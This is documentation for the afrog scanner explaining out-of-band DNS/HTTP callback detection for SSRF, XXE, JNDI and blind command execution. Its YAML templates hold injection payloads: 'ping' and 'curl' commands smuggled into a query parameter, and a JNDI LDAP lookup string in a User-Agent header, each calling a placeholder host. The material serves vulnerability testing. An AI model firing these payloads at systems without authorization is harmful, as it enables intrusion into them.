---
title: OOB 带外检测
slug: /docs/poc/oob
lang: zh
summary: afrog OOB 参考，帮助你判断什么时候该用带外检测、如何写新语法，以及怎么排障。
status: published
source: docs/afrog-poc-guide.md, docs/tutorial/rumen-dao-rutu/05-poc-advanced.md, afrog.wiki/OOB 体系大升级：新版写法与证据教程（v3.3.9）.md
last_reviewed: 2026-09-16
---

OOB（Out-of-Band）适用于那些“目标真的触发了，但 HTTP 响应里看不到证据”的漏洞。

这页最适合解决四类问题：

- 我这个漏洞是不是该用 OOB
- 该选 DNS 还是 HTTP 回连
- 当前推荐写法到底是什么
- OOB 没命中时该先查哪一层

如果你的 PoC 能直接在响应里拿到明确证据，通常不必先上 OOB；如果是 SSRF、XXE、JNDI、无回显命令执行这类场景，OOB 往往就是主路径。

## OOB 是什么

思路很简单：

1. 让目标去访问我们控制的域名或 URL
2. 去 OOB 平台查询有没有收到这次访问记录

收到记录，说明目标确实触发了对应链路。

## 先判断什么时候该用

推荐优先使用 OOB 的场景：

- SSRF
- XXE
- JNDI
- 无回显命令执行
- 只能通过 DNS / HTTP 回连确认的异步触发链路

不一定需要 OOB 的场景：

- 响应正文已经明确回显漏洞结果
- 只靠状态码、响应头、正文特征就能稳定确认

## 先选 DNS 还是 HTTP

最常见的经验：

- 想兼容性更高：优先 DNS
- 想拿到更完整请求痕迹：优先 HTTP

通常可以这么选：

| 类型 | 适合场景 | 默认建议 |
| --- | --- | --- |
| DNS OOB | SSRF、JNDI、命令执行探测 | 更常用 |
| HTTP OOB | 想拿到更明显的请求证据 | 更直观 |

## 新版推荐写法

当前推荐主流程是：

- `{{oob.DNS}}` / `{{oob.HTTP}}`
- `oobCheck(protocol, timeout)`

最小 DNS 示例：

```yaml
rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)

expression: r0()
```

### 当前最值得优先记住的 3 个点

1. 直接使用 `{{oob.DNS}}` / `{{oob.HTTP}}`
2. 用 `oobCheck("dns", 5)` 或 `oobCheck("http", 3)` 判断命中
3. 需要证据时用 `oobEvidence()`

## 常用模板

### DNS 外带

```yaml
id: demo-oob-dns

info:
  name: Demo OOB DNS
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)

expression: r0()
```

### HTTP 外带

```yaml
id: demo-oob-http

info:
  name: Demo OOB HTTP
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /?http=curl%20{{oob.HTTP}}
    expression: oobCheck("http", 3)

expression: r0()
```

### JNDI 观测

```yaml
id: demo-oob-jndi

info:
  name: Demo OOB JNDI
  author: your-name
  severity: info

rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        User-Agent: "${jndi:ldap://{{oob.DNS}}/a}"
    expression: oobCheck("dns", 5)

expression: r0()
```

## timeout 怎么选

经验上：

- HTTP OOB：通常 `3` 秒
- DNS OOB：通常 `5` 秒

如果你怀疑触发链路是异步任务，可以再逐步提高到 `8` 到 `15` 秒。

不要一开始就把 timeout 设得很大。更稳妥的方式是先用较小值验证，再按需要提高。

## 证据在哪里看

命中后，结果里会附带 `oob_evidence` 这类证据摘要。你通常可以在以下位置看到：

- 终端输出
- HTML 报告
- 其它消费结构化结果的页面或系统

如果你需要在表达式或输出中取证据，也可以使用：

```yaml
oobEvidence()
```

## 字段与函数速查

| 项目 | 作用 | 常见写法 |
| --- | --- | --- |
| `{{oob.DNS}}` | OOB DNS 域名 | 放进 query、header、payload |
| `{{oob.HTTP}}` | OOB HTTP URL | 放进 curl / wget / SSRF 目标 |
| `{{oob.Filter}}` | 当前 filter 标识 | 较少直接手写 |
| `oobCheck("dns", 5)` | 检查 DNS 回连是否命中 | 最常用 |
| `oobCheck("http", 3)` | 检查 HTTP 回连是否命中 | 常用 |
| `oobCheckToken("dns", 5, token)` | 带 token 精确校验 | 进阶 |
| `oobEvidence()` | 读取最近一次命中的证据摘要 | 调试 / 输出很有用 |

## 旧写法与新写法

旧写法常见形式：

```yaml
set:
  oob: oob()

rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
```

新版推荐写法更短，也更统一：

```yaml
rules:
  r0:
    request:
      method: GET
      path: /?dns=ping%20{{oob.DNS}}
    expression: oobCheck("dns", 5)
```

### 这里有一个很重要的现实差异

从当前代码路径来看，**旧 OOB 语法不应该再当作可持续写法继续使用**。仓库里已经有显式的旧 OOB 检测逻辑，会把这类 PoC 识别为 legacy OOB 并跳过加载。

所以更稳妥的结论不是“旧写法也还能继续写”，而是：

- 旧写法需要迁移
- 新写法才是现在应继续维护和新增的形式

## 常见失败原因

如果 OOB 没命中，优先排查：

1. 目标根本不出网
2. 平台配置错误
3. timeout 太短
4. payload 没真正触发
5. 旧语法或旧思路与当前版本不匹配

## 使用建议

1. 能直接回显就别强上 OOB
2. 初版 PoC 通常优先 DNS OOB
3. timeout 先小后大，别一开始就拉很高
4. 需要证据摘要时，尽量配合 `oobEvidence()`
5. 不再新增旧式 `set: oob: oob()`、`{{oobDNS}}`、`oobCheck(oob, ...)` 写法

## 配置提醒

OOB 平台本身需要先在配置文件里准备好。常见平台包括：

- ceye
- dnslog.cn
- alphalog
- xray
- revsuit

配置入口见：

- [配置文件说明](../user-guide/05-configuration.md)

## 一句话经验

OOB 不是“更高级的普通 PoC”，而是针对“结果不回显”场景的一整套证据链思路。先确认它真的需要，再把配置、payload 和 timeout 一起调顺。

> **← 上一篇：** [brute 机制](./05-brute.md) ｜ **本手册首页：** [PoC 编写快速开始](./01-quickstart.md) ｜ **下一篇 →：** [Raw HTTP](./07-raw-http.md)
